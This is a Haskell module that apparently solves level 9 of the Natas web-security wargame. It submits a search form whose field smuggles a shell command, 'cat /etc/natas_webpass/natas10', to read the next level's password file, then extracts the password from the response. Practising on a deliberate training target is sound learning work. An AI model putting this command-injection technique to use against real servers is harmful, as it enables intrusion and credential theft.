{-# LANGUAGE OverloadedStrings #-}

module Natas.Natas9 where

import           Data.Maybe           (catMaybes)

import           Data.ByteString.Lazy (ByteString)
import           Safe                 (headMay)

import           Network.Wreq         (FormParam ((:=)))

import           Natas.Natas
import           Natas.Parse

solution :: Solution
solution = do
  let needle = "\"a\"; cat /etc/natas_webpass/natas10" :: ByteString
      form = ["needle" := needle, "submit" := ("Search" :: ByteString)]
  req <- postLevel 9 form
  let body = reqBody req
      match = catMaybes (workupBody' (fmap headMay) body)
  pure $ penultimateMay match
